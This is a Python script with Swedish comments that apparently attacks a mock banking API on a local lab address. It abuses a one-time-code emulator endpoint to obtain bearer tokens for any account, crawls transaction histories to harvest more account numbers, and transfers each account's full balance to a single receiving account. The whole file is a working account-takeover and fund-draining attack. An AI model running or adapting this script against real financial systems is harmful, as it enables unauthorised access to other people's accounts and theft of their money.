import json
import http.client
import time


def getToken():
    # -------------------------------------- HÄMTA TOKEN OCH SKAPA AUTHENTICATION HEADER --------------------------------------

    url = "/get_token?account=" + kontoNr + "&challenge_response=" + securityCode
    conn = http.client.HTTPConnection("192.168.0.27", 5000)
    conn.request("GET", url)

    response = conn.getresponse()
    data = response.read()
    data = json.loads(data)

    data = {"Authorization": "Bearer " + str(data["value"])}

    return data


print("****CPC_WARNING******:::___Starting_The_Hack_In..... 5... 4... 3.... 2.... 1....", sep="n")

# -------------------------------------- HÄMTA CHALLENGE --------------------------------------


conn = http.client.HTTPConnection("192.168.0.27:5000")

conn.request("GET", "/get_challenge?account=1234567890")

response = conn.getresponse()
data = response.read()
data = json.loads(data)

challenge = data["value"]

conn.close()

# -------------------------------------- HÄMTA ENGÅNGSKOD --------------------------------------


url = "/sakerhetsdosa/emulator.php?account=1234567890&challenge=" + challenge

conn = http.client.HTTPConnection("192.168.0.27", 80)

conn.request("GET", url)
response = conn.getresponse()

securityCode = str(json.loads(response.read()))

conn.close()

# -------------------------------------- HÄMTA TOKEN OCH SKAPA AUTHENTICATION HEADER --------------------------------------


url = "/get_token?account=1234567890&challenge_response=" + securityCode
conn = http.client.HTTPConnection("192.168.0.27", 5000)
conn.request("GET", url)

response = conn.getresponse()
data = response.read()
data = json.loads(data)

data = {"Authorization": "Bearer " + str(data["value"])}

# -------------------------------------- HÄMTA HISTORY --------------------------------------


url = "/account_get_history?account=1234567890"
conn.request("GET", url, headers=data)

response = conn.getresponse()
data = response.read()
data = json.loads(data)

conn.close()

hackade_konton = []

# För varje dictionary i listan data["history"]

offer_konton = data["history"]
antal = len(offer_konton)
antal = int(antal)

x = 0
while (x < antal):

    dic = offer_konton[x]

    if dic["sender"] not in hackade_konton:
        hackade_konton.append(dic["sender"])

    if dic["receiver"] not in hackade_konton:
        hackade_konton.append(dic["receiver"])
    x += 1

conn.close()

# -------------------------------------- BÖRJA LOOPA GENOM VARJE KONTO --------------------------------------


num = 0
while (num < len(hackade_konton)):

    kontoNr = hackade_konton[num]

    # -------------------------------------- HÄMTA CHALLENGE --------------------------------------

    conn = http.client.HTTPConnection("192.168.0.27:5000")

    conn.request("GET", "/get_challenge?account=" + kontoNr)

    response = conn.getresponse()
    data = response.read()
    data = json.loads(data)

    challenge = data["value"]

    conn.close()

    # -------------------------------------- HÄMTA ENGÅNGSKOD --------------------------------------

    url = "/sakerhetsdosa/emulator.php?account=" + kontoNr + "&challenge=" + challenge

    conn = http.client.HTTPConnection("192.168.0.27", 80)

    conn.request("GET", url)
    response = conn.getresponse()

    securityCode = str(json.loads(response.read()))

    conn.close()

    # -------------------------------------- HÄMTA TOKEN OCH SKAPA AUTHENTICATION HEADER --------------------------------------

    url = "/get_token?account=" + kontoNr + "&challenge_response=" + securityCode
    conn = http.client.HTTPConnection("192.168.0.27", 5000)
    conn.request("GET", url)

    response = conn.getresponse()
    data = response.read()
    data = json.loads(data)

    data = {"Authorization": "Bearer " + str(data["value"])}

    # -------------------------------------- HÄMTA HISTORY --------------------------------------

    url = "/account_get_history?account=" + kontoNr
    conn.request("GET", url, headers=data)

    response = conn.getresponse()
    data = response.read()
    data = json.loads(data)

    # För varje dictionary i listan data["history"]

    offer_konton = data["history"]
    antal = len(offer_konton)
    antal = int(antal)

    x = 0
    while (x < antal):

        dic = offer_konton[x]

        if dic["sender"] not in hackade_konton:
            hackade_konton.append(dic["sender"])

        if dic["receiver"] not in hackade_konton:
            hackade_konton.append(dic["receiver"])
        x += 1
    print(len(hackade_konton))

    data = getToken()

    conn.request("GET", "/account_get_balance?account=" + kontoNr, headers=data)
    response = conn.getresponse()
    response = response.read()
    response = json.loads(response)

    saldo = response["balance"]

    url = "/account_make_transfer?account=" + kontoNr + "&receiver=1234567890&amount=" + str(saldo)

    try:
        conn.request("GET", url, headers=data)
        response = conn.getresponse()
        response = json.loads(response.read())
        print(saldo)
    except:
        print()
    # Få python att vänta här
    # time.sleep(1)


    num += 1

    conn.close()

y = 0
while y < len(hackade_konton):
    print(hackade_konton[y])
    y += 1
